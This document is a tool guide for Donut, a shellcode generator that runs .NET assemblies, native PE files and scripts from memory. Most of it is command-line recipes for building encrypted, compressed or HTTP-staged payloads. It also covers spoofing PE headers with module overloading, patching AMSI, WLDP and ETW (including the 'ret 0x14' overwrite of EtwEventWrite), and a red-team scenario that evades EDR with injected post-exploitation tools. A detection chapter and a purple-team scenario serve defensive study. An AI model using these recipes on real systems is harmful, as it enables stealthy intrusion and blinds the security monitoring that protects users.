---
title: "Donut"
tool_name: "donut"
category: "Shellcode & Payload"
phase: "02 - Resource Development"
difficulty: "Intermediate to Advanced"
platform: "Windows (built on Linux/Windows)"
language: "C, Go, Python"
license: "BSD-3-Clause"
repository: "https://github.com/TheWover/donut"
kali_package: "donut (pip install donut-shellcode)"
mitre_attack:
  tactic: "resource-development"
  technique_id: "TA0042"
  technique_name: "Resource Development"
  sub_technique: "shellcode_payload"
tags:
  - "shellcode"
  - "dotnet"
  - "in-memory-execution"
  - "amsi-bypass"
date_created: "2019-05-10"
last_updated: "2024-10-23"
author: "TheWover, odzhan"
---

# Donut — Comprehensive Documentation

---

## Chapter 1: Introduction & Overview

Donut generates position-independent shellcode that loads and executes .NET assemblies, native PE files, VBScript, and JScript entirely from memory. The generated shellcode is self-contained — it can be embedded in any loader, injected into a process, or delivered as raw bytes.

### Core Capabilities

- **.NET Assembly execution**: Loads the CLR via Unmanaged Hosting API, creates an AppDomain, and executes the assembly's entry point — all from memory.
- **Native PE loading**: Custom PE loader supports Delayed Imports, TLS callbacks, and relocation processing.
- **Script execution**: IActiveScript interface enables in-memory execution of VBScript and JScript.
- **AMSI/WLDP/ETW patching**: Modular bypass system for Windows security mechanisms.
- **Encryption**: Optional 128-bit Chaskey block cipher encryption of the embedded payload.
- **Compression**: aPLib, LZNT1, Xpress, and Xpress Huffman compression support.

### Output Formats

Donut produces shellcode in multiple formats: raw binary, C, Python, Ruby, PowerShell, C#, Base64, and hexadecimal string.

### Why Donut Matters

Traditional .NET payload delivery requires writing the assembly to disk or using `Assembly.Load()` from PowerShell — both are heavily monitored by modern EDR. Donut's CLR hosting approach executes .NET assemblies from position-independent shellcode, making it significantly harder to detect through conventional monitoring.

---

## Chapter 2: Installation & Setup

### From Source (Linux)

```bash
git clone https://github.com/TheWover/donut.git
cd donut
make
```

**Explanation:** Clones the Donut repository and compiles the generator and loader libraries using GCC.

### From Source (Windows)

```cmd
git clone https://github.com/TheWover/donut.git
cd donut
nmake -f Makefile.msvc
```

**Explanation:** Compiles using Microsoft Visual Studio build tools from an x64 Developer Command Prompt.

### Python Module (Recommended)

```bash
pip3 install donut-shellcode
```

**Explanation:** Installs the Donut Python module from PyPI, providing programmatic access to shellcode generation.

**Practical caveat:** Remove older versions first with `pip3 uninstall donut-shellcode` to avoid conflicts.

### Docker

```bash
docker build -t donut .
docker run -it --rm -v "${PWD}:/workdir" donut -h
```

**Explanation:** Builds Donut in a container and mounts the current directory for output file access.

### Verify Installation

```bash
donut -h
```

Expected output includes all available switches and their descriptions.

---

## Chapter 3: Basic Usage

### Generating .NET Assembly Shellcode

```bash
donut -f 1 -o payload.bin DemoCreateProcess.exe
```

**Explanation:** Generates raw shellcode (format 1) that will execute the DemoCreateProcess .NET assembly from memory.

### Generating with Specific Architecture

```bash
donut -a 2 -f 1 -o payload64.bin MyTool.exe
```

**Explanation:** Generates 64-bit (AMD64) shellcode for the target .NET assembly.

### Generating with HTTP Staging

```bash
donut -a 3 -f 1 -s http://192.168.1.100/ -n module.dat -o loader.bin MyTool.exe
```

**Explanation:** Creates shellcode that downloads the payload module from an HTTP server, splitting delivery to reduce initial footprint.

### Python Module Usage

```python
import donut

# Generate shellcode from a .NET assembly
shellcode = donut.create(file="MyTool.exe")
print(f"[*] Shellcode size: {len(shellcode)} bytes")

# Save to file
with open("payload.bin", "wb") as f:
    f.write(shellcode)
```

**Explanation:** Uses the Python API to generate shellcode programmatically, useful for integration into custom tools and automation.

### Complete Flags Reference

| Flag | Argument | Description |
|------|----------|-------------|
| **-a** | arch | Target architecture: 1=x86, 2=amd64, 3=x86+amd64 (default) |
| **-b** | level | AMSI/WLDP bypass: 1=None, 2=Abort on fail, 3=Continue on fail (default) |
| **-c** | class | Optional class name (required for .NET DLL): `namespace.class` |
| **-d** | name | AppDomain name for .NET (random if entropy enabled) |
| **-e** | level | Entropy: 1=None, 2=Random names, 3=Random names + encryption (default) |
| **-f** | format | Output format: 1=Binary, 2=Base64, 3=C, 4=Ruby, 5=Python, 6=PowerShell, 7=C#, 8=Hex |
| **-j** | decoy | Decoy module for Module Overloading (PE header spoofing) |
| **-k** | headers | PE headers: 1=Overwrite (default), 2=Keep all |
| **-m** | name | Method/function name for DLL (required for .NET DLL) |
| **-n** | name | Module name for HTTP staging (random if entropy enabled) |
| **-o** | path | Output file path (default: `loader.bin`) |
| **-p** | params | Parameters for DLL method or EXE execution |
| **-r** | version | CLR runtime version (MetaHeader default, or v4.0.30319) |
| **-s** | server | HTTP server URL for staging: `https://user:pass@192.168.1.100/` |
| **-t** | | Run entrypoint as thread and wait for completion |
| **-w** | | Pass command line to unmanaged DLL as UNICODE (default: ANSI) |
| **-x** | option | Exit behavior: 1=Exit thread (default), 2=Exit process, 3=Do not exit/block |
| **-y** | addr | Resume execution at offset after Donut completes (host process resume) |
| **-z** | engine | Compression: 1=None, 2=aPLib, 3=LZNT1, 4=Xpress, 5=Xpress Huffman |

---

## Chapter 4: Intermediate Usage

### Entropy Levels

| Level | Behavior | Use Case |
|-------|----------|----------|
| **1** | No entropy manipulation | Debugging, analysis |
| **2** | Random variable names | Basic evasion |
| **3** | Random names + AES encryption | Production red team |

```bash
# Maximum evasion: random names + encryption
donut -e 3 -f 1 -o encrypted_loader.bin MyTool.exe
```

**Explanation:** Entropy level 3 generates randomized variable names and encrypts the payload with a 128-bit Chaskey cipher key, significantly increasing the difficulty of static analysis.

### Module Overloading

Module overloading replaces the PE headers of the payload with those from a legitimate "decoy" module on the target system:

```bash
donut -j C:\Windows\System32\ntdll.dll -f 1 -o loader.bin MyTool.exe
```

**Explanation:** The generated shellcode will overwrite payload PE headers with ntdll.dll headers at runtime, making memory scanners see legitimate headers instead of the payload.

### HTTP Staging Configuration

```bash
# Stage payload from HTTPS server with authentication
donut -a 3 -s "https://admin:pass@192.168.1.100/" \
  -n loader.dat \
  -f 1 \
  -o stager.bin \
  MyTool.exe
```

**Explanation:** The shellcode downloads the full payload from the specified HTTPS server at execution time, with optional basic authentication.

### Output Format Conversion

```bash
# C array for embedding in C/C++ loaders
donut -f 3 -o payload.c MyTool.exe

# Python for script-based loaders
donut -f 5 -o payload.py MyTool.exe

# PowerShell for PowerShell-based delivery
donut -f 6 -o payload.ps1 MyTool.exe

# Base64 for text-based transport
donut -f 2 -o payload.b64 MyTool.exe
```

**Explanation:** Different output formats enable integration with various delivery mechanisms and loader frameworks.

### Compression Options

```bash
# aPLib compression (cross-platform)
donut -z 2 -f 1 -o compressed.bin MyTool.exe

# LZNT1 compression (Windows only)
donut -z 3 -f 1 -o compressed.bin MyTool.exe

# Xpress Huffman (Windows only, best ratio)
donut -z 5 -f 1 -o compressed.bin MyTool.exe
```

**Explanation:** Compression reduces shellcode size at the cost of a decompression step at runtime. LZNT1 and Xpress options only work with the Windows loader.

---

## Chapter 5: Advanced Usage

### .NET Assembly Requirements

For successful execution, the target .NET assembly must meet these criteria:

1. Entry point method takes only strings or no arguments
2. Entry point method must be `public static`
3. The class containing the entry point must be `public`
4. Assembly must NOT be Mixed (managed + native)
5. Assembly must NOT contain Unmanaged Exports

```bash
# For a DLL, specify the class and method
donut -c "MyNamespace.MyClass" -m "Run" -f 1 -o payload.bin MyPlugin.dll
```

**Explanation:** .NET DLLs require explicit class and method specification since they have no default entry point.

### CLR Hosting Internals

Donut's .NET execution works through the Unmanaged CLR Hosting API:

1. **CLR Initialization**: `CLRCreateInstance()` creates the ICLRMetaHost interface
2. **Runtime Selection**: `GetRuntime()` selects the CLR version (v4.0.30319 or as specified)
3. **AppDomain Creation**: `CreateDomain()` creates an isolated execution environment
4. **Assembly Loading**: `AppDomain.Load_3()` loads the assembly bytes into the AppDomain
5. **Entry Point Invocation**: Reflection invokes the specified method with parameters

### AMSI/WLDP/ETW Bypass Mechanisms

Donut patches three key Windows security mechanisms:

**AMSI (Antimalware Scan Interface):**
```c
// Conceptual: patches AmsiScanBuffer to return clean
// The default bypass patches the first few bytes of AmsiScanBuffer
// to return AMSI_RESULT_CLEAN immediately
```

**WLDP (Windows Lockdown Policy):**
```c
// Bypasses code integrity checks for dynamic code
// Ensures in-memory assembly loading is not blocked
```

**ETW (Event Tracing for Windows):**
```c
// Patches EtwEventWrite to prevent telemetry about .NET execution
// Derived from research by XPN on hiding .NET from ETW
```

### Exit Behavior Options

| Option | Behavior | Use Case |
|--------|----------|----------|
| **1** (default) | Exit the loader thread, host process continues | Injected into long-running processes |
| **2** | Exit the entire process | Standalone execution |
| **3** | Block indefinitely, do not exit | Persistent shellcode |

```bash
# Inject into explorer.exe, keep process alive
donut -x 1 -a 3 -f 1 -o loader.bin payload.exe

# Standalone execution
donut -x 2 -a 3 -f 1 -o loader.bin payload.exe
```

**Explanation:** Exit behavior determines what happens after the payload completes. Thread exit (option 1) is the most common for process injection, as it allows the host to continue running normally.

### Unmanaged PE Loading

Donut can load native Windows executables that contain relocation information:

```bash
donut -a 2 -f 1 -o native_loader.bin native_tool.exe
```

**Explanation:** Native PE loading uses a custom PE loader that processes relocations, delayed imports, and TLS callbacks — but the binary must have relocation information (most do).

---

## Chapter 6: Real-World Scenarios

### Scenario 1: Red Team — .NET Assembly Execution Without Disk

A red team engagement required executing a custom .NET post-exploitation tool on a target with behavioral EDR monitoring. Writing .NET assemblies to disk triggered immediate alerts.

```bash
# Generate donut shellcode for the .NET tool
donut -a 3 -e 3 -f 1 \
  -k 1 \
  -o loader.bin \
  PostExploitTool.exe

# The shellcode was embedded in a Cobalt Strike execute-assembly
# or injected into a running process via a custom loader
```

**Explanation:** Donut shellcode executes the .NET assembly entirely from memory, bypassing file-based detection. The AMSI/WLDP/ETW patches prevent runtime monitoring from capturing the assembly's activity.

### Scenario 2: Purple Team — CLR Injection Detection

The blue team needed to validate their ability to detect CLR injection attacks. Donut was used to generate test payloads for detection rule development:

```bash
# Generate multiple payload variants for testing
for method in "clr_load" "amsi_bypass" "etw_patch"; do
  donut -a 3 -b 3 -e 3 \
    -f 1 \
    -o "test_${method}.bin" \
    TestAssembly.exe
done

# Monitor with Sysmon, ETW, and EDR telemetry
# Document which indicators are captured
```

**Explanation:** Using Donut as a known-baseline CLR injection tool helps blue teams develop and tune detection rules for this attack pattern.

### Scenario 3: CTF — .NET Assembly Reverse Engineering

A CTF challenge provided a .NET DLL that needed to be executed in a specific way. The challenge required understanding Donut's execution model to extract the flag.

```bash
# Analyze the target assembly
donut -c "Challenge.CryptoSolver" -m "Decrypt" \
  -p "encrypted_flag_here" \
  -f 1 \
  -o solver.bin \
  Challenge.dll

# Execute with the correct parameters
```

**Explanation:** Understanding Donut's ability to invoke specific .NET methods with parameters provides a powerful technique for CTF challenges involving .NET assemblies.

---

## Chapter 7: Detection & Defense

### CLR Injection Detection

The companion tool **ModuleMonitor** detects CLR injection in real-time:

```bash
# Build and run ModuleMonitor
cd ModuleMonitor
# Monitors for CLR being loaded into processes that normally don't use it
```

**Explanation:** ModuleMonitor watches for CLR initialization in processes, which is the primary indicator of Donut-style injection attacks.

### Memory Scanning

Detection approaches for Donut shellcode:

- **AMSI integration**: Microsoft's AMSI scans in-memory .NET assemblies before execution (if not patched)
- **CLR monitoring**: Detect CLR creation in non-.NET processes
- **Memory region analysis**: Look for MEM_IMAGE regions without corresponding disk files
- **ETW providers**: Microsoft-Windows-DotNETRuntime and Microsoft-Windows-DotNETRuntimePrivate events

### Behavioral Indicators

- Process creates a new AppDomain not associated with normal .NET startup
- CLR DLL (clr.dll, clrjit.dll) loaded into a process that doesn't normally use .NET
- Network connections from processes with recently loaded CLR
- PowerShell or script interpreters spawning CLR-related processes

### Defensive Recommendations

1. **Enable AMSI** in Windows Defender — even if Donut patches it at runtime, the initial scan window may catch the payload
2. **Monitor ETW** for DotNETRuntime events — CLR initialization is logged before Donut can patch it
3. **Deploy Sysmon** with rules targeting CLR module loads
4. **Implement application whitelisting** to prevent unauthorized .NET assembly execution
5. **Use Windows Event Forwarding** to centralize .NET runtime telemetry

---

## Chapter 8: Troubleshooting

### Build Fails on Linux

**Cause:** Missing GCC or make.

```bash
sudo apt -y install build-essential gcc make
make
```

**Explanation:** Donut requires a C compiler and make. Install the build-essential meta-package on Debian/Ubuntu systems.

### "Unsupported .NET Assembly" Error

**Cause:** The assembly is Mixed (contains both managed and native code).

```bash
# Verify assembly type
dotnet tool install -g dotnet-ildasm
dotnet ildasm MyTool.exe | head -20
```

**Explanation:** Donut cannot execute Mixed assemblies. Verify the target is a pure managed assembly without unmanaged exports.

### Cygwin Binaries Fail

**Cause:** Cygwin executables use initialization routines that expect the host process to run from disk.

**Solution:** Compile the target without Cygwin dependencies, or use a native MinGW build.

**Explanation:** Cygwin's runtime initialization makes assumptions about disk-based execution that are incompatible with in-memory loading.

### CLR Version Mismatch

**Cause:** Target assembly requires a specific CLR version not available on the target.

```bash
# Force a specific CLR version
donut -r v4.0.30319 -f 1 -o payload.bin MyTool.exe
```

**Explanation:** Explicitly specifying the CLR runtime version ensures the loader requests the correct version from the host system.

### Payload Too Large

**Cause:** Large .NET assemblies exceed practical shellcode delivery limits.

```bash
# Enable compression
donut -z 5 -f 1 -o compressed.bin LargeAssembly.exe

# Or use HTTP staging
donut -s http://192.168.1.100/ -n payload.dat -f 1 -o stager.bin LargeAssembly.exe
```

**Explanation:** Compression reduces size by 40-70%. HTTP staging splits the payload — only a small loader is needed as shellcode.

### Supported Loader Executables

Donut generates standalone loader executables that wrap the shellcode:

| Loader | Platform | Description |
|--------|----------|-------------|
| `loader_x86.exe` | Windows x86 | 32-bit loader for x86 shellcode |
| `loader_x64.exe` | Windows x64 | 64-bit loader for amd64 shellcode |
| `DonutTest.exe` | Windows | C# injector for testing shellcode |
| `inject.exe` | Windows | Injects raw binary into another process |
| `inject_local.exe` | Windows | Injects raw binary into its own process |

These loaders can be used independently of the shellcode generator for testing purposes.

### Entropy Level Selection Guide

| Level | Output Characteristics | Best For |
|-------|----------------------|----------|
| **1 (None)** | Predictable patterns | Debugging, reverse engineering |
| **2 (Names)** | Randomized variable names | Basic evasion |
| **3 (Full)** | Random names + encrypted payload | Red team operations |

Level 3 is the recommended default for offensive operations. Level 1 is useful when analyzing how Donut works internally, as the predictable patterns make the loader easier to understand.

### Compression Ratio Reference

| Method | Ratio | Speed | Compatibility |
|--------|-------|-------|---------------|
| None | 1:1 | Instant | All platforms |
| aPLib | ~60% | Fast | Cross-platform |
| LZNT1 | ~55% | Fast | Windows only |
| Xpress | ~50% | Medium | Windows only |
| Xpress Huffman | ~45% | Slow | Windows only |

The tradeoff is between compression ratio and decompression speed. For most use cases, aPLib provides the best balance.

### ETW Bypass Details

Donut's ETW bypass targets `EtwEventWrite` in `ntdll.dll`. The default bypass:

1. Locates `EtwEventWrite` in the process's ntdll.dll
2. Overwrites the first few bytes with a `ret 0x14` instruction
3. This causes the function to return immediately without writing any telemetry
4. The bypass is applied before the target assembly executes

This prevents .NET runtime events from being logged, hiding the CLR execution from ETW consumers like Sysmon and Microsoft Defender for Endpoint.

---

## Resources

### Official Documentation

- [Donut GitHub](https://github.com/TheWover/donut) — Source code and documentation
- [Developer Notes](https://github.com/TheWover/donut/blob/master/docs/devnotes.md) — Internal implementation details
- [Python Extension Guide](https://github.com/TheWover/donut/blob/master/docs/2019-08-21-Python_Extension.md) — Python API documentation

### Related Research

- [Loading .NET Assemblies From Memory](https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/) — Technical deep dive
- [In-Memory Execution of DLL](https://modexp.wordpress.com/2019/06/24/inmem-exec-dll/) — Native PE loading internals
- [Disabling AMSI and WLDP](https://modexp.wordpress.com/2019/06/03/disable-amsi-wldp-dotnet/) — Security bypass research
- [ETW Bypass for .NET](https://blog.xpnsec.com/hiding-your-dotnet-etw/) — ETW telemetry evasion

### Companion Tools

- [ModuleMonitor](https://github.com/TheWover/donut/tree/master/ModuleMonitor) — CLR injection detection
- [ProcessManager](https://github.com/TheWover/donut/tree/master/ProcessManager) — Process discovery for injection targets
- [DonutTest](https://github.com/TheWover/donut/tree/master/DonutTest) — C# shellcode injector for testing

### Donut Release History

| Version | Date | Codename | Key Changes |
|---------|------|----------|-------------|
| v0.9 | 2019-05 | Initial Release | Basic .NET assembly loading |
| v0.9.1 | 2019-06 | Apple Fritter | VBScript/JScript support |
| v0.9.2 | 2019-07 | Bear Claw | Compression, encryption |
| v1.0 | 2021 | Full Release | ETW bypass, module overloading |
| v1.1 | 2024-10 | Donut Hole | Latest stable release |

### Why Choose Donut Over Other Tools?

| Scenario | Recommended Tool | Reason |
|----------|-----------------|--------|
| .NET payload execution | Donut | Native CLR hosting support |
| Standard reverse shell | MSFvenom | Simpler, broader payload options |
| AV evasion | Veil | Language-based obfuscation |
| PE infection | Shellter | Code cave injection |
| Linux process backdoor | Cymothoa | ptrace-based injection |
| Binary trojan | BDF | Multi-format patching |

Donut's unique strength is .NET assembly execution from position-independent shellcode — a capability no other tool in this category provides.

---

*Last updated: July 2026*
